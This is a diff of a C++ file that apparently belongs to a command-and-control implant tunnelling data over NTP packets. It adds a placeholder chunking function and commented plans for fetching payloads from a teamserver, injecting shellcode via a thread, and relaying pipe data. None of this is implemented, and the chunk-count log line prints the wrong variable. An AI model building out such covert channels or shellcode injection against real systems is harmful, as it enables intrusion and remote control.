@@ -24,6 +24,25 @@ Extension Field Key:
 #include "helpers.hpp"
 #include <vector>
 
+std::vector<uint8_t> chunker(std::vector<uint8_t> data) {
+	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
+	size_t dataSize = data.size();
+
+
+	int amountOfChunks = dataSize / Chunk::maxChunkSize;
+	std::cout << "[?] Data of size " << dataSize << " will need " << dataSize << " chunks to send." << std::endl;
+
+	//loop over data, chunk data into pieces
+
+		//parse packet wtih NTPPacketParser
+		//if response != an aknlowdgement from the server, then add to chunker array to return that data?
+
+	//when done looping, return array
+	std::vector<uint8_t> placehodlerVec = { 0 };
+	return placehodlerVec;
+}
+
+
 int main() {
 	//Stuff here
 
@@ -53,9 +72,41 @@ int main() {
 
 
 	//print full packet
-	packet.printPacket();
+	//packet.printPacket();
+	printHexVectorPacket(packet_bytes);
+	chunker(packet_bytes);
 
 }
+
+
+//Note, have payload functino be simiar to above, but diff due to data coming back and needing to be retuend
+
+//void logic() {
+
+	//! Need a dedicated chunking function, that does the chunking logic,and just easily returns the response fromthe server
+
+	//3 seperate functions of how to do this now:
+
+	//GetPayload function(){};
+	//Create payload packet (giveMePayload)
+
+	//Send giveMePayload packet
+		// > Get size of payload from sizePacket
+		// > iterate over payload chunks until data = what was in size packet
+
+
+	//InjectPayload function();
+	//Injection method for running shellcode, go with basic injection method, with a thread.
+
+	//ReadPipe Function();
+	//attempt to read pipe
+		//	
+		//send data to teamserver: sendDataToTeamServer
+		//recieve data from teamserver with getDataFromTeamserver, in response
+
+	//attempt to write to pipe
+	//goto attempt to read pipe
+//}
 
 /*
 Next steps:
